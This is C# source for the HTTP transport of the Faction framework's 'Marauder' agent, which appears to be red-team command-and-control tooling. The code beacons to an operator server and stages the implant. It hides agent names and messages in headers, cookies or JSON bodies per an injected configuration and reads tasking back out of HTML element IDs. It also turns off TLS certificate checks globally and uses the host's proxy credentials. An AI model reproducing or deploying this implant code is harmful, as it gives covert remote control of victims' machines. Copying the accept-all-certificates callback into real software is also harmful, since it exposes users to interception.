using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using Faction.Modules.Dotnet.Common;
using HtmlAgilityPack;
using Newtonsoft.Json;

namespace Faction.Modules.Dotnet.Common
{
    public class Transport  : AgentTransport
    {
        new public string Name = "HTTP";

        public class Profile
        {
            public Dictionary<string, Dictionary<string, string>> HttpGet { get; set; }
            public Dictionary<string, Dictionary<string, string>> HttpPost { get; set; }
        }

        // Configuration profile will be "injected" via the Faction Build Service as a b64 string
        public string _configString = "CONFIG";

        string _jsonConfig => Encoding.UTF8.GetString(Convert.FromBase64String(_configString));

        Profile _config => JsonConvert.DeserializeObject<Profile>(_jsonConfig);

        private WebClient CreateWebClient(bool ignoreSSL, string profile)
        {
            WebClient _webClient = new WebClient();
            
            // add proxy aware webclient settings
            _webClient.Proxy = WebRequest.DefaultWebProxy;
            _webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            if (ignoreSSL)
            {
                //Change SSL checks so that all checks pass
                ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );
            }

            if (profile == "HttpGet")
            {
                if (_config.HttpGet.ContainsKey("Headers") && _config.HttpGet["Headers"].Count != 0)
                {
                    foreach (var header in _config.HttpGet["Headers"])
                        _webClient.Headers.Add(header.Key, header.Value);

                }
                if (_config.HttpGet.ContainsKey("Cookies") && _config.HttpGet["Cookies"].Count != 0)
                {
                    foreach (var cookie in _config.HttpGet["Cookies"])
                        _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");

                }
            }
            if (profile == "HttpPost")
            {
                if (_config.HttpPost.ContainsKey("Headers") && _config.HttpPost["Headers"].Count != 0)
                {
                    foreach (var header in _config.HttpPost["Headers"])
                        _webClient.Headers.Add(header.Key, header.Value);

                }
                if (_config.HttpPost.ContainsKey("Cookies") && _config.HttpPost["Cookies"].Count != 0)
                {
                    foreach (var cookie in _config.HttpPost["Cookies"])
                        _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");

                }
            }

            return _webClient;
        }
        private Dictionary<string, string> DoStagePost(string StageName, string StagingId, string StageMessage)
        {
            Dictionary<string, string> response = new Dictionary<string, string>();

            try
            {
                string beaconUrl = String.Format($"{_config.HttpPost["Server"]["Host"]}/{_config.HttpPost["Server"]["URLs"]}");

                bool _ignoreSSL = _config.HttpPost["Server"]["IgnoreSSL"] == "true";

                // Create a new WebClient object and load the Headers/Cookies per the Client Profile
                WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpPost");

                // Add the Stage Message into the request per the configuration
                var _messageLocation = _config.HttpPost["ClientPayload"]["Message"];
                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], StageMessage);
                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={StageMessage}");

                // For a Staging Message, map AgentName to StagingId
                var _agentLocation = _config.HttpPost["ClientPayload"]["AgentName"];
                if (_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], StagingId);
                if (_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_agentLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={StagingId}");

                var _nameLocation = _config.HttpPost["ClientPayload"]["StageName"];
                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], StageName);
                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={StageName}");

                // get all the properties that should be in the Body section
                var _bodyProperties = _config.HttpPost["ClientPayload"]
                    .Where(v => v.Value.Contains("Body"));

                Dictionary<string, string> _bodyContent = new Dictionary<string, string>();

                foreach (var property in _bodyProperties)
                {
                    if (property.Key == "StageName")
                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageName}");
                    if (property.Key == "AgentName")
                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StagingId}");
                    if (property.Key == "Message")
                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{StageMessage}");
                }

                string jsonMessage = JsonConvert.SerializeObject(_bodyContent);

                _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");

                Console.WriteLine($"[Marauder Http Transport] Sending POST. URL: {beaconUrl} Message: {jsonMessage}");

                string content = _webClient.UploadString(beaconUrl, jsonMessage);

                // parse the content based on the "shared" configuration
                response = GetPayloadContent(content, _webClient.ResponseHeaders, "HttpPost");

                return response;
            }
            catch (Exception e)
            {
                // We don't want to cause an breaking exception if it fails to connect
                Console.WriteLine($"[Marauder HTTP Transport] Connection failed: {e.Message}");

                return response;
            }
        }

        private Dictionary<string, string> DoGetRequest(string AgentName, string Message)
        {
            Dictionary<string, string> response = new Dictionary<string, string>();

            try
            {
                string beaconUrl = String.Format($"{_config.HttpGet["Server"]["Host"]}/faction.html", AgentName);

                bool _ignoreSSL = _config.HttpGet["Server"]["IgnoreSSL"] == "true";

                // Create a new WebClient object and load the Headers/Cookies per the Client Profile
                WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpGet");

                // Add the Beacon Message into the request per the configuration
                var _messageLocation = _config.HttpGet["ClientPayload"]["Message"];
                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], Message);
                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");

                var _nameLocation = _config.HttpGet["ClientPayload"]["AgentName"];
                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");

                Console.WriteLine($"[Marauder Http Transport] Sending Get. URL: {beaconUrl}");

                string content = _webClient.DownloadString(beaconUrl);
                Console.WriteLine($"[Marauder Http Transport] Got response. {content}");
                
                // parse the content based on the "shared" configuration
                response = GetPayloadContent(content, _webClient.ResponseHeaders, "HttpGet");

                return response;
            }
            catch (Exception e)
            {
                // We don't want to cause an breaking exception if it fails to connect
                Console.WriteLine($"[Marauder HTTP Transport] Connection failed: {e.Message}");

                return response;
            }
        }
        private Dictionary<string, string> DoPostRequest(string AgentName, string Message)
        {
            Dictionary<string, string> response = new Dictionary<string, string>();

            try
            {
                string beaconUrl = String.Format($"{_config.HttpPost["Server"]["Host"]}/{_config.HttpPost["Server"]["URLs"]}", AgentName);

                bool _ignoreSSL = _config.HttpPost["Server"]["IgnoreSSL"] == "true";

                // Create a new WebClient object and load the Headers/Cookies per the Client Profile
                WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpGet");

                // Add the Beacon Message into the request per the configuration
                var _messageLocation = _config.HttpPost["ClientPayload"]["Message"];
                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], Message);
                if (_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_messageLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={Message}");

                var _nameLocation = _config.HttpPost["ClientPayload"]["AgentName"];
                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    _webClient.Headers.Add(_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], AgentName);
                if (_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Cookie")
                    _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");

                // get all the properties that should be in the Body section
                var _bodyProperties = _config.HttpPost["ClientPayload"]
                    .Where(v => v.Value.Contains("Body"));

                Dictionary<string, string> _bodyContent = new Dictionary<string, string>();

                foreach (var property in _bodyProperties)
                {
                    if (property.Key == "AgentName")
                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{AgentName}");
                    if (property.Key == "Message")
                        _bodyContent.Add($"{property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]}", $"{Message}");
                }

                string jsonMessage = JsonConvert.SerializeObject(_bodyContent);

                _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");
                _webClient.Headers.Add(HttpRequestHeader.ContentLength, jsonMessage.Length.ToString());

                Console.WriteLine($"[Marauder Http Transport] Sending POST. URL: {beaconUrl} Message: {jsonMessage}");

                string content = _webClient.UploadString(beaconUrl, jsonMessage);

                // parse the content based on the "shared" configuration
                response = GetPayloadContent(content, _webClient.ResponseHeaders, "HttpPost");

                return response;
            }
            catch (Exception e)
            {
                // We don't want to cause an breaking exception if it fails to connect
                Console.WriteLine($"[Marauder HTTP Transport] Connection failed: {e.Message}");

                return response;
            }
        }
        private Dictionary<string, string> GetPayloadContent(string pageContent, WebHeaderCollection responseHeaders, string Profile)
        {
            Dictionary<string, string> _message = new Dictionary<string, string>();

            if (Profile == "HttpGet")
            {
                Dictionary<string, string> _payloadLocation = _config.HttpGet["ServerPayload"];

                foreach (var property in _payloadLocation)
                {
                    string _propKey = null;
                    string _propValue;

                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    {
                        _propKey = property.Key;
                        _propValue = responseHeaders[property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]];
                        _message.Add(_propKey, _propValue);
                    }

                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
                    {
                        _propKey = property.Key;
                        HtmlDocument pageDocument = new HtmlDocument();
                        pageDocument.LoadHtml(pageContent);
                        _propValue = pageDocument.GetElementbyId(property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
                        _message.Add(_propKey, _propValue);
                    }
                }
            }
            if (Profile == "HttpPost")
            {
                Dictionary<string, string> _payloadLocation = _config.HttpPost["ServerPayload"];

                foreach (var property in _payloadLocation)
                {
                    string _propKey = null;
                    string _propValue;

                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
                    {
                        _propKey = property.Key;
                        _propValue = responseHeaders[property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1]];
                        _message.Add(_propKey, _propValue);
                    }

                    if (property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
                    {
                        _propKey = property.Key;
                        HtmlDocument pageDocument = new HtmlDocument();
                        pageDocument.LoadHtml(pageContent);
                        _propValue = pageDocument.GetElementbyId(property.Value.Split("::".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
                        _message.Add(_propKey, _propValue);
                    }
                }
            }

            return _message;
        }

        public override string Stage(string StageName, string StagingId, string Message)
        {

            Dictionary<string, string> responseDict = new Dictionary<string, string>();
            responseDict = DoStagePost(StageName, StagingId, Message);

            return responseDict["Message"];
        }

        public override string Beacon(string AgentName, string Message)
        {

            Dictionary<string, string> responseDict = new Dictionary<string, string>();

            // If there is no Message data, do a post request
            if (!String.IsNullOrEmpty(Message))
            {
                Console.WriteLine($"[Marauder Http Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
                responseDict = DoPostRequest(AgentName, Message);
            }
            
            // If we have data to return, do a simple Http Get (Check-in) for any new content
            else
            {
                Console.WriteLine($"[Marauder Http Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
                responseDict = DoGetRequest(AgentName, Message);
            }

            return responseDict["Message"];
        }
    }
}
